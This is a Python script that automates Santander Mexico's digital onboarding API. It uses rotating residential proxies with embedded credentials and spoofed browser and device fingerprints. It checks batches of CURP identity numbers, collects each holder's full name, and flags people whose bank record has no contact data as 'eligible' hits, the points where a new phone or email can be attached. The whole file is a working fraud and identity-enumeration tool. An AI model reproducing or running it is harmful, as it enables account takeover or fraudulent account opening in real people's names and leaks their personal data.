import asyncio
import sys
import time
import json
import random
from typing import Optional, Dict, Any, List
from curl_cffi import requests


def format_short_reason(detail: str) -> str:
    if not detail:
        return "Rechazo"
    short = detail.strip()
    if "PE1002" in short:
        return "PE1002"
    elif "timeout" in short.lower():
        return "Timeout"
    elif "confirm-contact" in short or "contacto" in short.lower():
        return "Reg. previo"
    elif "derivation" in short.lower() or "likeu" in short.lower():
        return "LikeU Pro"
    elif "sucursal" in short.lower() or "rechazo" in short.lower():
        return "Sucursal"
    return short[:15].strip()


def get_default_residential_proxy() -> Dict[str, str]:
    # Cuenta refondeada 2026-09-30 (santabase1_custom_zone_MX). Verificado con curl directo desde
    # Karen VPS: HTTP 200 contra onboarding.santander.com.mx, sid rotativo confirma IPs residenciales
    # MX distintas por request (187.188.x, 189.183.x). Fuente única: purger e app.py la importan de aquí.
    sid = random.randint(10000000, 99999999)
    return {
        "server": "http://us.proxy001.com:7878",
        "username": f"santabase1_custom_zone_MX_ssid_{sid}_time_10",
        "password": "Santabase123"
    }


def _check_curp_sync(
    curp: str,
    proxy: Optional[Dict[str, str]] = None,
    state: str = "NUEVO LEON",
    lat: str = "25.748",
    lon: str = "-100.285"
) -> Dict[str, Any]:
    t0 = time.time()
    if proxy is None:
        proxy = get_default_residential_proxy()

    srv = proxy.get("server", "").replace("http://", "").replace("https://", "")
    usr = proxy.get("username", "")
    pwd = proxy.get("password", "")
    if usr and pwd:
        proxy_url = f"http://{usr}:{pwd}@{srv}"
    else:
        proxy_url = f"http://{srv}"

    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 15; Pixel 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "es-419,es;q=0.9",
        "Referer": "https://onboarding.santander.com.mx/cuenta-digital-lite/personal-data",
        "Origin": "https://onboarding.santander.com.mx",
        "Content-Type": "application/json"
    }

    proxies = {"http": proxy_url, "https": proxy_url}
    session = requests.Session(impersonate="chrome120", proxies=proxies)

    try:
        # Paso 1: Inicializar sesión en onboarding
        r1 = session.get(
            "https://onboarding.santander.com.mx/api/v1/obu/N2/multitask/session/init",
            headers=headers,
            timeout=10
        )
        if r1.status_code != 200:
            return {
                "curp": curp,
                "status": "RETRY",
                "detail": f"Init HTTP {r1.status_code}",
                "time": round(time.time() - t0, 1)
            }

        # Paso 2: Aceptar términos y condiciones
        r2 = session.post(
            "https://onboarding.santander.com.mx/api/v1/obu/N2/multitask/agreements/accept",
            headers=headers,
            json={
                "data": {
                    "privacy": True,
                    "termsAndConditions": True,
                    "originFlow": "/cuenta-digital-lite/personal-data"
                }
            },
            timeout=10
        )
        if r2.status_code != 200:
            return {
                "curp": curp,
                "status": "RETRY",
                "detail": f"Agreements HTTP {r2.status_code}",
                "time": round(time.time() - t0, 1)
            }

        # Paso 3: Consultar CURP en RENAPO
        r3 = session.post(
            "https://onboarding.santander.com.mx/api/v1/obu/N2/multitask/curp/consulta",
            headers=headers,
            json={"data": {"birthCountry": "052", "mainPersonalIdentifier": curp}},
            timeout=10
        )
        if r3.status_code != 200:
            err_msg = ""
            try:
                err_msg = r3.json().get("notifications", [{}])[0].get("message", "")
            except Exception:
                pass
            if "no encontrada" in err_msg.lower() or "invalida" in err_msg.lower():
                return {
                    "curp": curp,
                    "status": "OFF",
                    "detail": f"CURP inválida/no RENAPO ({r3.status_code})",
                    "time": round(time.time() - t0, 1)
                }
            return {
                "curp": curp,
                "status": "RETRY",
                "detail": f"Consulta HTTP {r3.status_code}",
                "time": round(time.time() - t0, 1)
            }

        d3 = r3.json().get("data", {})
        client_name = f"{d3.get('name', '')} {d3.get('lastName', '')} {d3.get('secondLastName', '')}".strip()

        # Paso 4: Validar preexistencia contra el Core Bancario Santander
        r4 = session.post(
            "https://onboarding.santander.com.mx/api/v1/obu/case/registrada/N2/preexistence/validar",
            headers=headers,
            json={
                "data": {
                    "state": state,
                    "os": "Android",
                    "deviceVersion": "Android Google Pixel 9 15",
                    "browserSize": "400x850",
                    "resolutionScreen": "800x1700",
                    "latitude": lat,
                    "longitude": lon
                }
            },
            timeout=12
        )
        if r4.status_code != 200:
            return {
                "curp": curp,
                "status": "RETRY",
                "detail": f"Preexistence HTTP {r4.status_code}",
                "time": round(time.time() - t0, 1)
            }

        d4 = r4.json().get("data", {})
        pantalla = d4.get("pantallaSiguiente")
        folio = d4.get("folio")
        dur = round(time.time() - t0, 1)

        # Clasificación Canónica de Santander:
        # datos_contacto_02 -> Requiere captura fresca de celular/correo (Limbo/Sin contacto) = HIT (ON)
        # datos_contacto_01 / 03 -> Contacto preexistente enmascarado (OTP requerido a teléfono no disponible) = OFF
        # derivacion_01 -> Derivación LikeU Pro comercial = OFF
        # derivacion_02 / 03 / sucursal -> Rechazo o derivación a sucursal = OFF
        if pantalla == "datos_contacto_02":
            return {
                "curp": curp,
                "status": "ON",
                "detail": "Elegible: avanzó a contact-data",
                "pantallaSiguiente": pantalla,
                "folio": folio,
                "name": client_name,
                "time": dur
            }
        elif pantalla in ("datos_contacto_01", "datos_contacto_03"):
            return {
                "curp": curp,
                "status": "OFF",
                "detail": "Contacto preexistente (/confirm-contact)",
                "pantallaSiguiente": pantalla,
                "folio": folio,
                "time": dur
            }
        elif pantalla in ("derivation-pro", "derivacion_01"):
            return {
                "curp": curp,
                "status": "OFF",
                "detail": "Derivación LikeU Pro (/derivation-pro)",
                "pantallaSiguiente": pantalla,
                "folio": folio,
                "time": dur
            }
        elif any(k in str(pantalla).lower() for k in ["derivacion", "sucursal", "rechazo"]):
            return {
                "curp": curp,
                "status": "OFF",
                "detail": f"Rechazo en pantalla ({pantalla})",
                "pantallaSiguiente": pantalla,
                "folio": folio,
                "time": dur
            }
        else:
            return {
                "curp": curp,
                "status": "RETRY",
                "detail": f"Pantalla inesperada ({pantalla})",
                "pantallaSiguiente": pantalla,
                "folio": folio,
                "time": dur
            }

    except Exception as ex:
        return {
            "curp": curp,
            "status": "RETRY",
            "detail": f"Excepción red: {str(ex)[:60]}",
            "time": round(time.time() - t0, 1)
        }
    finally:
        session.close()


async def check_single_curp(
    curp: str,
    proxy: Optional[dict] = None,
    state: str = "NUEVO LEON",
    lat: str = "25.748",
    lon: str = "-100.285"
) -> dict:
    """Verifica un CURP vía pipeline HTTP directo (Chrome 120 TLS) en ~5-7 segundos sin navegadores."""
    return await asyncio.to_thread(_check_curp_sync, curp, proxy=proxy, state=state, lat=lat, lon=lon)


async def run_batch(curps: list[str], concurrency: int = 3) -> list[dict]:
    queue = asyncio.Queue()
    for i, c in enumerate(curps, 1):
        queue.put_nowait((i, c))

    results = [None] * len(curps)

    async def worker():
        while not queue.empty():
            try:
                idx, curp = await queue.get()
            except Exception:
                break
            res = await check_single_curp(curp)
            results[idx - 1] = res
            queue.task_done()

    workers = [asyncio.create_task(worker()) for _ in range(min(concurrency, len(curps)))]
    await queue.join()
    for w in workers:
        w.cancel()
    return results


def format_markdown_table(results: list[dict]) -> str:
    lines = [
        f"**Reporte Santander ({len(results)}/{len(results)})**\n",
        "| # | CURP | Estado | Detalle | Tiempo |",
        "|:---:|:---|:---:|:---|:---:|"
    ]
    for i, r in enumerate(results, 1):
        badge = "ON [OK]" if r["status"] == "ON" else f"{r['status']} [X]"
        lines.append(f"| {i} | `{r['curp']}` | **{badge}** | {r['detail']} | {r['time']}s |")
    return "\n".join(lines)


if __name__ == "__main__":
    if hasattr(sys.stdout, "reconfigure"):
        try:
            sys.stdout.reconfigure(encoding="utf-8")
        except Exception:
            pass
    test_curp = sys.argv[1] if len(sys.argv) > 1 else "RAER880904HNLMLB01"
    print(f"Testing CURP: {test_curp} via HTTP curl_cffi...", flush=True)
    res = asyncio.run(run_batch([test_curp]))
    print(format_markdown_table(res))
